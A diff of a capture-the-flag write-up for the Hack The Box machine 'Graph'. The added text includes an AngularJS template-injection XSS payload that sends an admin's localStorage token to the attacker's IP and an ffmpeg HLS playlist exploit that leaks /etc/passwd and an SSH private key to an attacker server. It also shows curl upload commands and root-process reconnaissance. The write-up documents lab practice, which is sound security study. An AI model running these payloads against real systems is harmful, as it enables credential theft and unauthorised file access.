@@ -7,14 +7,14 @@
 ```shell
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA)
 |   256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA)
 |_  256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519)
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 |_http-title: Did not follow redirect to http://graph.htb
 |_http-server-header: nginx/1.18.0 (Ubuntu)
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 ```
 
@@ -532,14 +532,13 @@ The previous SSTI payload can be improved to read the local storage:
 This can be parametrized and encapsulated into a JS fetch request:
 
 ```shell
-PAYLOAD='{{$on.constructor('"'"'new Image().src=\"http://'"${IP}"'/?token=\"+window.localStorage.getItem(\"adminToken\");'"'"')()}}'
-CODE='fetch("http://internal-api.graph.htb/graphql", {
-    method: "POST",
-    headers: {"Content-Type": "application/json",},
-    credentials: "include",
-    body: JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n update(\n newusername: $newusername\n id: $id\n firstname: $firstname\n lastname: $lastname\n) {\n username\n email\n id\n firstname\n lastname\n __typename\n}\n}"}),
-})'
+PAYLOAD='{{$on.constructor("+String.fromCharCode(39)+"new Image().src="+String.fromCharCode(34)+"http://'"${IP}"'/?token="+String.fromCharCode(34)+"+window.localStorage.getItem("+String.fromCharCode(34)+"adminToken"+String.fromCharCode(34)+");"+String.fromCharCode(39)+")()}}'
+CODE='var request = new XMLHttpRequest();request.open("POST","http://internal-api.graph.htb/graphql",false);request.setRequestHeader("Content-Type","text/plain");request.withCredentials=true;request.send(JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername:$newusername,id:$id,firstname:$firstname,lastname:$lastname) {username,email,id,firstname,lastname,adminToken}}"}))'
 ```
+
+The special characters like quotes are added by the JS interpreter rather than planted from the start, since it caused encoding problems.
+
+Also the request is made synchronously, I had issues with `fetch`.
 
 ### Exfiltrate and admin token
 
@@ -551,25 +550,132 @@ bash payloads/register.sh
 # get the user id of the admin that sends a message
 bash payloads/get_userid.sh Mark
 # craft a redirect XSS to inject the exfiltration payload in the admin profile
-bash payloads/ssti_profile.sh $'629babb17f2d0a05fc3730f1' $'Mark' $'10.10.16.2:9999' | uglifyjs > payload
+bash payloads/ssti_profile.sh $'629babb17f2d0a05fc3730f1' $'Mark' $'10.10.16.2:9999' | uglifyjs > exfil.js
 # generate the redirection URL
-bash payloads/redirect.sh $(cat payload)
+bash payloads/redirect.sh $(cat exfil.js) > url.txt
 # finally, send the resulting URL to the admin by message
 # and then redirect to the logout to actually load the code from the server
 ```
 
 And fi-nal-ly exfiltrate an "adminToken"! O-M-G...
 
+Hopefully the box made it obvious this was the way, otherwise I'd have dropped this XSS attempt long ago...
+
+> `c0b9db4c8e4bbb24d59a3aaffa8c8b83`
+
+## Exploiting ffmpeg
+
+The `uploads` endpoint uses `ffmpeg` to convert the uploaded file, which is known to have a LFR vulnerability.
+
+[This report][hackerone-tiktok] describes the exploitation steps, and it is [coded here][pat-ffmpeg].
+
+The code is tweaked to implement the solution from "ach" on Hackerone. It injects a playlist in a minimal avi file, which calls back to the server:
+
+```python
+TXT_PLAYLIST = """#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://10.10.16.2:8888/header.m3u8|subfile,,start,{start},end,10000,,:{file}
+#EXT-X-ENDLIST"""
+```
+
+The line breaks have to be accounted for:
+
+```shell
+python payloads/generate_avi_lfr.py --start 32 /etc/passwd ~/downloads/test.avi
 ```
 
 ```
+Ncat: Connection from 10.10.11.157:33112.
+GET /?daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin HTTP/1.1
+```
 
-## Compromise an OS used
+Reading `/etc/passwd` will allow to find an active user and hopefully a SSH key:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+user:x:1000:1000:user:/home/user:/bin/bash
+```
+
+All these to learn that the user is named "user"...
+
+```shell
+python payloads/generate_avi_lfr.py /home/user/.ssh/id_rsa test.avi --start 377
+curl -i -s -k -X $'POST' \
+    -H $'Host: internal-api.graph.htb' \
+    -H $'admintoken: c0b9db4c8e4bbb24d59a3aaffa8c8b83' \
+    -H $'Content-Type: multipart/form-data;' \
+    -F $'file=@test.avi' \
+    $'http://internal-api.graph.htb/admin/video/upload'
+```
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd
+1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA
+AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2
+3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+##
+
+There's unique file running as root:
+
+```shell
+ps auxf
+# \_ /usr/sbin/CRON -f
+#     \_ /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
+#         \_ sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
+#             \_ socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
+pspy
+# 2022/06/05 18:27:16 CMD: UID=0    PID=949    | socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
+# 2022/06/05 18:27:16 CMD: UID=0    PID=948    | sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
+# 2022/06/05 18:27:16 CMD: UID=0    PID=947    | /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
+# 2022/06/05 18:27:16 CMD: UID=0    PID=946    | /usr/sbin/atd -f
+# 2022/06/05 18:27:16 CMD: UID=0    PID=940    | /usr/sbin/CRON -f
+file /usr/local/bin/Nreport/nreport
+# /usr/local/bin/Nreport/nreport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/local/bin/Nreport/libc/ld-2.25.so, for GNU/Linux 3.2.0, BuildID[sha1]=fab56bbb7a23ada8a8f5943b527d16f3cdcb09e5, not stripped
+```
 
 [author-profile]: https://app.hackthebox.com/users/172213
 [disabled-dashboard]: images/disabled-dashboard.png
+[hackerone-tiktok]: https://hackerone.com/reports/1062888
 [internal-registration]: images/interal-registration.png*
 [local-storage]: images/local-storage.png
+[pat-ffmpeg]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
 [registration-otp]: images/registration-otp.png
 [share-localstorage]: https://stackoverflow.com/questions/4026479/use-localstorage-across-subdomains
 [upload-form]: images/upload-form.png
